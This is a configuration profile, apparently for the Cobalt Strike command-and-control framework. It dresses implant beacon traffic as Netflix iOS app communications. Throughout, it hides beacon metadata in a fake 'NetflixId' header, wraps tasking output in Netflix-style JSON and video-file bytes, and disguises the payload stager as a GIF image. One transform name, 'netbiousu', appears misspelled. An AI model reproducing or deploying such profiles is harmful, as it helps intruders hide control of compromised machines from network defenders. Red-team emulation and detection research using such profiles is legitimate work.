# Made to look like Netflix communications
#
# Created by @vysecurity
# Based on webbug profile by @armitagehacker

set sleeptime "5000";

http-get {
	set uri "/iosui/user/9.0";
	client {
		parameter "appInternalVersion" "9.0.0";
		parameter "appVersion" "9.0.0";
		parameter "device_type" "NFAPPL-02-";
		parameter "idiom" "phone";
		parameter "iosVersion" "10.1.1";
		parameter "pixelDensity" "2.0";
		parameter "config" "%7B%22roarEnabled%22%3A%22false%22%2C%22warmerHasGenres%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22useSecureImages%22%3Atrue%2C%22showMoreDirectors%22%3Atrue%2C%22bigRowEnabled%22%3A%22false%22%7D";

		metadata {
			netbiousu;
			prepend "ct%3D";
			header "NetflixId";
		}
	}

	server {
		header "Content-Type" "application/json;charset=UTF-8";

		header "X-Netflix-From-Zuul" "true";
		header "X-Netflix.execution-time" "98";
		header "X-Netflix.nfstatus" "1_1";

		output {
			netbiousu;
			prepend "{\"value\":{\"videos\":{\"80025758\":{\"trickplayInfo\":{\"frameInterval\":10,\"thumbnailCount\":366,\"240\":{\"baseUrl\":\"http://tp.akam.nflximg.com/tpa2/873/a4a25b1300e8d86ec82e5454952370ae\",\"bifUrl\":\"http://tp.akam.nflximg.com/tpa3/663/aeb8eda42bd6a3af1f763f2e1f076bb4.bif\",\"width\":240,\"height\":108},\"320\":{\"baseUrl\":\"http://tp.akam.nflximg.com/tpa3/440/623d4cf3ad833bc2da4da0461592fd77\",\"bifUrl\":\"http://tp.akam.nflximg.com/tpa5/121/75cd0cf95d265d85e2ceb67a1a5cafb6.bif\",\"width\":320,\"height\":160},\"640\":{\"baseUrl\":\"http://tp.akam.nflximg.com/tpa5/755/c4a38c321c70dd0d8454b736f690c6ae\",\"bifUrl\":null,\"width\":640,\"height\":320},\"encryption\",\"";


			append "\"\"$type\":\"leaf\"},\"externalPlayerArtWork\":{\"nowPlayingArtWork\":\"http://art-0.nflximg.net/3fc0f/192b7dd428764f78d0ff9c10d4064d119443fc0f.jpg\",\"airPlayArtWork\":\"http://art-0.nflximg.net/4570f/218203d31878a6dbe7464ae8e9808a2affd4570f.jpg\",\"mdxNowPlaying\":\"http://art-0.nflximg.net/249b5/786916af292d9d2a2929fd91919ec2a7909249b5.jpg\",\"mdxPostPlay\":\"http://art-2.nflximg.net/5544b/77ad76a842e05e0b7d33c377af3e284b38f5544b.jpg\",\"$type\":\"leaf\"}}}},\"paths\":[[\"videos\",\"80025758\",\"trickplayInfo\"],[\"videos\",\"80025758\",\"externalPlayerArtWork\"]]}";

			print;
		}
	}
}

http-post {
	set uri "/";
	set verb "POST";
	client {
		id {
			netbiosu;
			parameter "X-Playback-Session-Id";
		}

		parameter "o" "AQGCRbeF8Pjp8eZtis8m57IarrSlbReeqxC8N7PzC4xwRWVKOeadC_RwwsJKtfih_DKx2hDpiJQjQG1JcgurAm7nVE2vQfJi8Op3tFKIF4n9ZJFCe3jKzbwP8r1Pylma8JeYcJQkQIITA4F5J8GQnrzG5dp-M0ryM98";

		parameter "v" "3";
		parameter "e" "1482047395";
		parameter "t" "O2qC_fEOPyXzzr-ZAC_wENFmFyY";

		output {
			base64url;
			print
		}
	}

	server {
		header "Content-Type" "application/octet-stream";

		output {
			prepend "\x00\x02\xCB\x6D\x6F\x6F\x66\x00\x00\x00\x10\x6D\x66\x68\x64\x00\x00\x00\x00\x00\x00\x06\xE1\x00\x00\x02\xB3\x74\x72\x61\x66\x00\x00\x00\x14\x74\x66\x68\x64\x00\x02\x00\x20\x00\x00\x00\x01\x02\xA0\x00\x00\x00\x00\x00\x14\x74\x66\x64\x74\x01\x00\x00\x00\x00\x00\x00\x00\x05\x09\x14\x00\x00\x00\x02\x48\x74\x72\x75\x6E\x00\x00\x0B\x01\x00\x00\x00\x2F\x00\x00\x02\xD3\x00\x00\x04\x00\x00\x00\x02\x0F\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xF6\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02\x1A\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xE8\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02\x02\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02\x17\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xF9\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xFC\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02\x0A\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xEB\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\xF2\x00\x00\x00\x00\x00\x00\x04\x00";
			print;
		}
	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}